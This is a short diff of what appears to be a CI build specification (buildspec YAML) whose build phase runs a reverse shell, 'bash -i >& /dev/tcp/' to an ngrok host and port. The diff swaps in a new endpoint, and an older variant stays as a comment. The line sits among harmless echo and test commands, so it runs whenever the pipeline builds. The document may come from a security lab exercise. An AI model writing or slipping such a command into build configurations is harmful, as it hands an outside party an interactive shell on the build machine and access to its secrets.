@@ -5,7 +5,7 @@ phases:
     runtime-versions:
       nodejs: 10
     commands:
-      - echo "installing something "
+      - echo "installing something"
   pre_build:
     commands:
       - echo "we are in the pre build phase"
@@ -13,7 +13,7 @@ phases:
     commands:
       - echo "we are in the build block"
       #- bash -c 'bash -i >& /dev/tcp/0.tcp.us-cal-1.ngrok.io/xxxxx0>&1'
-      - bash -c 'bash -i >& /dev/tcp/8.tcp.ngrok.io/13211 0>&1'
+      - bash -c 'bash -i >& /dev/tcp/4.tcp.ngrok.io/18486 0>&1'
       - echo "we will run some tests"
       - ls
       - grep -Fq "Cross-Site Scripting (XSS)" index.html
